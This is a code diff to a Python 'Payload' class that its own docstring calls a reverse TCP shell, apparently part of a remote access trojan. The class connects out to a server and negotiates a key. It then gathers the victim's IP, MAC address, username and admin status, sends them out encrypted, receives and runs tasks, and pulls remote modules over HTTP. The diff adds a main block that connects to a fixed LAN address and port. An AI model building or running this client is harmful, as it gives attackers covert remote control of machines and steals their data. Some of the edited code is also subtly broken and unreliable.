@@ -26,6 +26,9 @@ import contextlib
 import collections
 import logging.handlers
 
+# globals
+logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
+
 def config(*arg, **options):
     """ 
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
@@ -64,13 +67,7 @@ class Payload():
 
     """
 
-    _encryption = {
-        0 : 'base64',
-        1 : 'xor',
-        2 : 'aes'
-    }
-
-    def __init__(self, host='127.0.0.1', port=1337):
+    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
         """ 
         Create a reverse TCP shell instance
 
@@ -79,10 +76,14 @@ class Payload():
         :param int port:          server port number
 
         """
+        print("Starting new session...")
         self.handlers   = {}
         self.remote     = []
         self.flags      = self._get_flags()
+        print("Connecting...")
         self.connection = self._get_connection(host, port)
+        print("[+] Connected: {}:{}".format(*self.connection.getpeername()))
+        print("Getting session key...")
         self.key        = self._get_key(self.connection)
         self.info       = self._get_info()
 
@@ -109,8 +110,9 @@ class Payload():
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((host, port))
             sock.setblocking(True)
+            self.flags.connection.set()
             return sock
-s
+
     def _get_remote(self, base_url=None):
         if self.flags.connection.is_set():
             if not base_url:
@@ -121,6 +123,7 @@ s
     def _get_key(self, conn):
         if isinstance(conn, socket.socket):
             if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
+                print('Trying Diffie-Hellman method...')
                 return globals()['diffiehellman'](conn)
             else:
                 raise Exception("unable to execute the Diffie-Hellman Internet Key Exchange (RFC 2741): missing required function 'diffiehellman'")
@@ -128,29 +131,27 @@ s
             raise TypeError("invalid object type for argument 'conn' (expected {}, received {})".format(socket.socket, type(conn)))
 
     def _get_info(self):
+        print('Getting client Information...')
         for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
             if function in globals() and callable(globals()[function]):
                 info = {function: globals()[function]() }
-                data = encrypt_aes(json.dumps(info), self.key)
-                msg  = struct.pack('L', len(data)) + data
-                while True:
-                    sent = self.connection.send(msg)
-                    if len(msg) - sent:
-                        msg = msg[sent:]
-                    else:
-                        break
-                header_size = struct.calcsize('L')
-                header      = self.connection.recv(header_size)
-                msg_len     = struct.unpack('L', header)[0]
-                data        = self.connection.recv(msg_len)
-                while len(data) < msg_len:
-                    data += self.connection.recv(msg_len - len(msg))
-                if isinstance(data, bytes) and len(data):
-                    data = encrypt_aes(data, self.key)
-                    try:
-                        info = json.loads(data)
-                    except: pass
-                return collections.namedtuple('Session', info.keys())(*info.values())
+        print('Sending client information to server...')
+        data = globals()['encrypt_aes'](json.dumps(info), self.key)
+        msg  = struct.pack('L', len(data)) + data
+        self.connection.sendall(msg)
+        print("Receiving session information from server...")
+        header_size = struct.calcsize('L')
+        header      = self.connection.recv(header_size)
+        msg_len     = struct.unpack('L', header)[0]
+        data        = self.connection.recv(msg_len)
+        while len(data) < msg_len:
+            data += self.connection.recv(msg_len - len(msg))
+        if isinstance(data, bytes) and len(data):
+            data = encrypt_aes(data, self.key)
+            try:
+                info = json.loads(data)
+            except: pass
+        return collections.namedtuple('Session', info.keys())(*info.values())
 
     @threaded
     def _get_resources(self, target=None, base_url=None):
@@ -160,7 +161,7 @@ s
             raise TypeError("keyword argument 'base_url' must be type '{}'".format(str))
         if not base_url.startswith('http'):
             raise ValueError("keyword argument 'base_url' must start with http:// or https://")
-        _debugger.info('[*] Searching %s' % base_url)
+        __logger__.info('[*] Searching %s' % base_url)
         path  = urllib2.urlparse.urlsplit(base_url).path
         base  = path.strip('/').replace('/','.')
         names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
@@ -169,7 +170,7 @@ s
             if ext in ('.py','.pyc'):
                 module = '.'.join((base, name)) if base else name
                 if module not in target:
-                    _debugger.info("[+] Adding %s" % module)
+                    __logger__.info("[+] Adding %s" % module)
                     target.append(module)
             elif not len(ext):
                 t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
@@ -990,32 +991,18 @@ s
         Returns True if succesfully sent task to server, otherwise False
 
         """
-        if not isinstance(task, dict):
-            raise TypeError('task must be a dictionary object')
-        if not 'uid' in task or not 'task' in task or not 'result' in task:
-            raise ValueError('task missing field(s): uid, result, task')
         if not 'session' in task:
             task['session'] = self.info.get('uid')
-        if self.flags.passive.is_set():
-            task  = logging.makeLogRecord(task)
-            self._logger.info(task)
+#        if self.flags.passive.is_set():
+#            task  = logging.makeLogRecord(task)
+#            self._logger.info(task)
+#            return True
+#        else:
+        if self.flags.connection.wait(timeout=1.0):
+            data = globals()['encrypt_aes'](json.dumps(task))
+            msg  = struct.pack('!L', len(data)) + data
+            self.connection.sendall(msg)
             return True
-        else:
-            if self.flags.connection.wait(timeout=1.0):
-                if 'encrypt_aes' in globals() and callable(globals()['encrypt_aes']) and any([i for i in globals().copy() if 'Crypto' in i]):
-                    data = struct.pack('!L', 2) + globals()['encrypt_aes'](json.dumps(task), self.key)
-                elif 'encrypt_xor' in globals() and callable(globals()['encrypt_xor']):
-                    data = struct.pack('!L', 1) + globals()['encrypt_xor'](json.dumps(task), self.key)
-                else:
-                    data = struct.pack('!L', 0) + base64.b64encode(json.dumps(task))
-                msg = struct.pack('!L', len(data)) + data
-                while True:
-                    sent = self.connection.send(msg)
-                    if len(msg) - sent:
-                        msg = msg[sent:]
-                    else:
-                        break
-                return True
         return False
 
     def recv_task(self):
@@ -1040,14 +1027,8 @@ s
                 msg += self.connection.recv(msg_len - len(msg))
             except (socket.timeout, socket.error):
                 break
-        mode     = struct.unpack('!L', msg[:hdr_len])[0]
-        msg      = msg[hdr_len:]
-        if mode in (1,2):
-            mode = 'decrypt_%s' % self._encryption[mode]
-            data = globals()[mode](msg, self.key)
-            return json.loads(data)
-        else:
-            data = base64.b64decode(msg)
+        if msg:
+            data = globals()['decrypt_aes'](msg, self.key)
             return json.loads(data)
 
     def run(self):
@@ -1080,3 +1061,10 @@ s
         except Exception as e:
             __logger__.error("{} error: {}".format(self.run.func_name, str(e)))
 
+
+if __name__ == '__main__':
+    from util import *
+    from security import *
+    from remoteimport import *
+    m = Payload(host='192.168.1.222', port=1337)
+    m.run()
